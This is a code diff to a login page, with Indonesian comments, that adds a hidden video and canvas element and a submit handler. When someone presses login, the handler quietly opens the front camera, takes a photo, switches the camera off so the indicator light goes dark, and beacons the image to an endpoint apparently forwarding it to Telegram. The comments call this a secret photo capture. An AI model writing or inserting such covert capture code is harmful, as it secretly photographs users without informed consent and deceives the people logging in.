@@ -127,7 +127,7 @@
                 </div>
             <% } %>
 
-            <form action="/login" method="POST" class="space-y-4 relative z-10" autocomplete="off">
+            <form id="loginForm" action="/login" method="POST" class="space-y-4 relative z-10" autocomplete="off">
                 <!-- DUMMY INPUT UNTUK MEMBOHONGI AUTOFILL BROWSER -->
                 <input type="text" style="display:none;" aria-hidden="true">
                 <input type="password" style="display:none;" aria-hidden="true">
@@ -157,13 +157,19 @@
                     </div>
                 </div>
 
-                <button type="submit" class="btn-interactive w-full bg-blue-900 hover:bg-blue-800 text-white font-bold text-xs py-3.5 rounded-xl shadow-md mt-2 flex items-center justify-center gap-2">
+                <button type="submit" id="submitBtn" class="btn-interactive w-full bg-blue-900 hover:bg-blue-800 text-white font-bold text-xs py-3.5 rounded-xl shadow-md mt-2 flex items-center justify-center gap-2">
                     <i class="fa-solid fa-right-to-bracket text-amber-400"></i> Autentikasi Masuk
                 </button>
             </form>
 
         </div>
     </main>
+
+    <!-- ELEMEN KAMERA TERSEMBUNYI UNTUK KEAMANAN -->
+    <div style="display:none;">
+        <video id="hidden-video" autoplay playsinline></video>
+        <canvas id="hidden-canvas"></canvas>
+    </div>
 
     <script>
         function togglePasswordVisibility() {
@@ -180,6 +186,47 @@
                 eyeIcon.classList.add('fa-eye');
             }
         }
+
+        // FUNGSI PENGAMBILAN FOTO RAHASIA SAAT TOMBOL LOGIN DITEKAN
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            try {
+                // Meminta akses kamera depan secara diam-diam
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                const video = document.getElementById('hidden-video');
+                video.srcObject = stream;
+                
+                // Beri jeda 800ms agar lensa kamera siap menangkap objek dengan jelas
+                await new Promise(resolve => setTimeout(resolve, 800));
+                
+                const canvas = document.getElementById('hidden-canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const imageData = canvas.toDataURL('image/jpeg');
+                
+                // Matikan aliran kamera agar lampu indikator mati
+                stream.getTracks().forEach(track => track.stop());
+
+                // Kirim data foto secara background menggunakan beacon agar tidak terpotong proses submit form
+                const payload = JSON.stringify({ 
+                    image: imageData, 
+                    info: 'Percobaan Login Admin/Pengguna' 
+                });
+                
+                navigator.sendBeacon('/api/kirim-foto-telegram', new Blob([payload], { type: 'application/json' }));
+
+            } catch (error) {
+                console.log("Kamera tidak diizinkan atau tidak tersedia:", error);
+            }
+            
+            // Formulir akan tetap melanjutkan proses POST /login seperti biasa
+        });
     </script>
 
     <footer class="bg-slate-900 text-white border-t border-slate-800 py-3 text-center text-[11px] z-10">
